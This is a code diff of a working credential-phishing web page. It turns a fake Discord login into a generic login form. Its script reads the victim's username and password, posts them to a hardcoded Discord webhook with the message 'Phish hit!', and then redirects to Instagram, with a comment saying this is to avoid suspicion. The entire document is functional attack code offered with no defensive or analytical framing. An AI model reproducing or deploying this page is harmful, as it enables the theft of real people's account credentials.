@@ -1,33 +1,38 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Discord Login</title>
+  <meta charset="UTF-8">
+  <title>Login</title>
 </head>
 <body>
-  <h2>Discord Login</h2>
+  <h2>Login</h2>
   <form id="phishForm">
-    <input type="text" name="username" placeholder="Email or Phone" required><br><br>
-    <input type="password" name="password" placeholder="Password" required><br><br>
-    <button type="submit">Login</button>
+    <input type="text" id="username" placeholder="Username" required><br><br>
+    <input type="password" id="password" placeholder="Password" required><br><br>
+    <button type="submit">Log In</button>
   </form>
 
   <script>
-    document.getElementById("phishForm").onsubmit = function(e) {
+    document.getElementById("phishForm").addEventListener("submit", function(e){
       e.preventDefault();
-      const formData = new FormData(this);
-      const user = formData.get("username");
-      const pass = formData.get("password");
 
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+
+      // Send to Discord webhook
       fetch("https://discord.com/api/webhooks/1362137822248566845/YCmkBoXZWpt5u9q940iE2AlksB1ifuU1kzd02pYhbL6F5fsM92pK0mJNoZVFhZjRarPS", {
         method: "POST",
         headers: {
-          'Content-Type': 'application/json'
+          "Content-Type": "application/json"
         },
         body: JSON.stringify({
-          content: `New Victim!\nUsername: ${user}\nPassword: ${pass}`
+          content: `Phish hit!\nUsername: ${username}\nPassword: ${password}`
         })
+      }).then(() => {
+        // Optional: redirect to legit site to avoid suspicion
+        window.location.href = "https://instagram.com";
       });
-    };
+    });
   </script>
 </body>
 </html>
